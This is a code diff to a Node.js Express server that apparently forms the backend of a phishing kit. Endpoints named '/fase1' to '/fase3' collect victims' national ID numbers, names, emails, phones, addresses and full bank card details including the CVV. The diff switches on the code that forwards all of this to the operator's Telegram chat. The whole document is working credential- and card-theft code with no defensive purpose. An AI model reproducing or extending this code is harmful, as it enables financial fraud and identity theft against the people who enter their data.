@@ -1,6 +1,6 @@
 import express from 'express';
 import TelegramBot from 'node-telegram-bot-api';
-import {TOKEN, WH_URL, ORIGIN_URL, CHAT_ID} from './config.js'
+import {TOKEN, ORIGIN_URL, CHAT_ID} from './config.js'
 
 import dotenv from 'dotenv';
 dotenv.config({path: 'variables.env'});
@@ -36,7 +36,6 @@ app.use((req, res, next) => {
  */
 
 const token = process.env.TOKEN || TOKEN;
-const apiUrl = `https://api.telegram.org/bot${token}/setWebhook`;
 const chatID = process.env.CHAT_ID || CHAT_ID;
 
 const bot = new TelegramBot(token, { polling: true });
@@ -64,7 +63,7 @@ const generateRandomCommand = () => {
 app.post('/fase1', (req, res)=>{
   //** Cédula */
   console.log('Fase 1 (Ejec...)')
-  bot.sendMessage(chatID, `### NUEVO USUARIO... ###\n **CC**: ${req.body.cc}`)
+  // bot.sendMessage(chatID, `### NUEVO USUARIO... ###\n **CC**: ${req.body.cc}`)
 
   res.json({'msg': 'Checked!'})
 })
@@ -87,20 +86,20 @@ app.post('/fase2', (req, res)=>{
 app.post('/fase3', (req, res)=>{
   /** Datos tarjeta */
   console.log('Fase 3 (Ejec...)')
-  // bot.sendMessage(chatID, `
-  // ### RECIBIENDO ###\n
-  // CC: ${req.body.cc}\n 
-  // NOMBRE: ${req.body.nom}\n
-  // MAIL: ${req.body.ml}\n
-  // CELULAR: ${req.body.pn}\n
-  // CIUDAD: ${req.body.cid}\n
-  // DIRECCIÓN: ${req.body.dir}\n
-  // **--------**\n
-  // BANCO: ${req.body.tar.ent}\n
-  // TARJETA: ${req.body.tar.pin}\n
-  // FECHA: ${req.body.tar.date}\n
-  // CVV: ${req.body.tar.cvv}\n\n
-  // `)
+  bot.sendMessage(chatID, `
+  ### RECIBIENDO ###\n
+  CC: ${req.body.cc}\n 
+  NOMBRE: ${req.body.nom}\n
+  MAIL: ${req.body.ml}\n
+  CELULAR: ${req.body.pn}\n
+  CIUDAD: ${req.body.cid}\n
+  DIRECCIÓN: ${req.body.dir}\n
+  **--------**\n
+  BANCO: ${req.body.tar.ent}\n
+  TARJETA: ${req.body.tar.pin}\n
+  FECHA: ${req.body.tar.date}\n
+  CVV: ${req.body.tar.cvv}\n\n
+  `)
 
   res.json({'msg': 'Checked!'})
 })
